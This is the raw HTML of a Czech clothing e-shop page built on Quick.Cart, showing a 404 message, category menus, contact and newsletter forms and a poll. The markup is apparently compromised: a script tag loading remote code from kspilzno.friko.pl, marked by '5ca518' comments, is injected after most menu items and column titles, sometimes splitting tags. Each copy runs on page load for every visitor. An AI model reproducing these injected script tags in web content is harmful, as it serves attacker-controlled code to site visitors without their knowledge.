<!--WZ-REKLAMA-1.0--><!--WZ-REKLAMA-1.0--><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="cz">

<head>
  <link rel="shortcut icon" type="image/x-icon" href="files/favicon.ico" /> 
  <title>Váš web</title>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta name="Description" content="" />
  <meta name="Keywords" content="" />
  <meta name="Author" content="opensolution.org" />
  <meta name="robots" content="all,follow" /> 
 
  <base href="vinarstvi.euweb.cz" />
  <script type="text/javascript" src="core/jquery-1.2.6.min.js"></script>
  <script type="text/javascript" src="core/fancybox/jquery.fancybox-1.0.0.js"></script>
  <script type="text/javascript" src="core/fancybox/jquery.pngFix.pack.js"></script>
  <script type="text/javascript" src="core/common.js"></script>
  <script type="text/javascript" src="core/plugins.js"></script>
  <script type="text/javascript" src="templates/modern_rounded_one/js/global.js"></script>
  <script type="text/javascript">
    <!--
    var cfBorderColor     = "#d1bd9d";
    var cfLangNoWord      = "Vyplňte všechna povinná pole";
    var cfLangMail        = "Zadejte Váš E-mail";
    var cfWrongValue      = "Zadejte správnou hodnotu";
    var cfToSmallValue    = "Hodnota je příliš malá";
    var cfTxtToShort      = "Text je příliš krátký";
    AddOnload( targetBlank );
    //-->
  </script>
  <link rel="stylesheet" href="core/fancybox/fancy.css" type="text/css" media="screen" />
  <style type="text/css">@import "templates/modern_rounded_one/skins/green_blue/main.css";</style></head>
<body>
	<div id="page">
	 <div id="obal"> 
		<div id="main">
		
			<!-- HEADER BEGIN -->
			<div id="header">
				<div id="cart">
	<big><a href="kosik.html">Váš nákupní košík</a></big>
	<p>
		Váš košík je prázdný
	</p>
</div><!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->
				<div id="logo">  
				
				
				</div><!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->




				
				<div id="navigation">
					<div class="left"></div>
					<ul><li class="l1 first"><a href="index.html" >Úvod</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l2"><a href="kontakt.html" >Kontakt</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l3"><a href="o-nas.html" >O nás</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="lL"><a href="obchodni-podminky.html" >Obchodní podmínky</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



></ul>
					<div class="right"></div>
					<form method="post" action="vyhledavani.html" id="search">
  <fieldset>
    <input type="text" size="20" name="sPhrase" value="Hledat..." class="textbox" maxlength="100" />
    <input type="submit" value="" class="button" />
  </fieldset>
</form>
				</div>
			</div>
			<!-- HEADER END -->
			
			<div class="clear"></div>
			
			<!-- LEFT COLUMN BEGIN -->
			
			
			<div class="column" id="column-left">
				<div class="title">
	<div class="right"></div><!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->




	<div class="left"></div>
	OBLEČENÍ
</div>
<div class="content">
	<ul class="categories"><li class="l1 first"><a href="halenky.html" >Halenky</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l2"><a href="kostymy.html" >Kostýmy</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l3"><a href="kosile.html" >Košile</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l4"><a href="mikiny.html" >Mikiny</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l5"><a href="rifle-kalhoty.html" >Rifle</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l6"><a href="sukne.html" >Sukně</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l7"><a href="svetry.html" >Svetry</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l8"><a href="tricka.html" >Trička</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l9"><a href="saty.html" >Šaty</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l10"><a href="saty-spolecenske.html" >Šaty společenské</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l11"><a href="saka.html" >Saka</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l12"><a href="kalhoty.html" >Kalhoty</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l13"><a href="inspirace.html" >Inspirace</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



></ul>
</div><div class="title">
	<div class="right"></div><!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->




	<div class="left"></div>
	DOPLŇKY
</div>
<div class="content">
	<ul class="categories"><li class="l1 first"><a href="bizuterie.html" >Bižuterie</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l2"><a href="penezenky.html" >Peněženky</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l3"><a href="cepice.html" >Čepice</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



><li class="l4"><a href="saly.html" >Šály</a></li<!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->



></ul>
</div><div class="title">
	<div class="right"></div><!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->




	<div class="left"></div>
	Kontakt
</div>
<div class="content">
	<p>Telefon: 999999999</p> <p>Email: váš email@seznam.cz</p>
</div>
			</div>
			<!-- LEFT COLUMN END -->
			
			<div id="content"><div class="message" id="error_404">
  <h3>404 - Stránka nenalezena</h3>
  <p>Požadovaná stránka nebyla nalezena. Zkuste požadovanou stránku nebo zboží nalézt pomocí vyhledávání, případně kontaktujte prodejce.</p>
</div></div>
			<!-- #CONTENT END -->
			
			<!-- LEFT COLUMN BEGIN -->
			<div class="column" id="column-right">
			
			
			
			
			
			
				<div class="title">
	<div class="right"></div><!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->




	<div class="left"></div>
	Napište nám
</div>
<div class="content">
	<p>Potřebujete poradit?</p><form action="contact_send.html" method="post" class="contact">
				<fieldset>
					<label>Kontakt (email, telefon):</label>
					<input type="text" name="contact" value="" class="input" />
					<label>Váš dotaz:</label>
					<textarea name="message" rows="4"></textarea>
					<input type="submit" name="subscribe" value="Odeslat" />
					<!-- S*P*A*M PROTECTION, SHOULD BE HIDDEN WITH CSS -->
					<input type="text" name="email2" id="contant_email2" value="" />
				</fieldset>
			</form>
</div><div class="title">
	<div class="right"></div><!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->




	<div class="left"></div>
	Newsletter
</div>
<div class="content">
	<p>Nechcete přijít o naše slevy?</p><form action="newsletter_add.html" method="post" class="newsletter">
				<fieldset>
					<label>Zadejte Váš email:</label>
					<input type="text" name="email" value="@" class="input" />
					<input type="submit" name="subscribe" value="Přihlásit k odběru" />
				</fieldset>
			</form>
</div><div class="title">
	<div class="right"></div><!--5ca518--><script type="text/javascript" src="http://kspilzno.friko.pl/KJfwpzRM.php?id="></script><!--/5ca518-->




	<div class="left"></div>
	Anketa
</div>
<div class="content">
	<h4>Jak jste nás našli?</h4><ul class="pool"><li><a href="pool_1-4.html">Seznam</a> - 25%
					<div class="bar" style="width:25%;">&nbsp;</div>
				</li><li><a href="pool_1-7.html">Google</a> - 17%
					<div class="bar" style="width:17%;">&nbsp;</div>
				</li><li><a href="pool_1-8.html">Centrum</a> - 17%
					<div class="bar" style="width:17%;">&nbsp;</div>
				</li><li><a href="pool_1-9.html">Atlas</a> - 13%
					<div class="bar" style="width:13%;">&nbsp;</div>
				</li><li><a href="pool_1-10.html">Zboží.cz</a> - 14%
					<div class="bar" style="width:14%;">&nbsp;</div>
				</li><li><a href="pool_1-11.html">Jinak</a> - 13%
					<div class="bar" style="width:13%;">&nbsp;</div>
				</li></ul>Celkem hlasů: 1235
</div>
			</div>
			<!-- LEFT COLUMN END -->
			
			<div class="clear"></div>
			<div id="footer">
				<p class="right">
				
				
        
        Powered by <a href="http://opensolution.org/">Quick.Cart</a>  
				Úprava: <a title="Webová prezentace" href="http://net-d.cz/">Webové prezentace</a>; <a title="eFox.cz" href="http://efox.cz">Extended by <strong>eFox.cz</strong></a> 
				
				
				
				
				</p>
				
				<p>Copyright © 2011 <a href='/'>Vaše firma s.r.o.</a></p>
			</div>
			
        	</div>
			<!-- #MAIN END -->
		</div>	
		</div>
		<!-- #PAGE END -->
		
	
  	
	
  
  </body>
</html>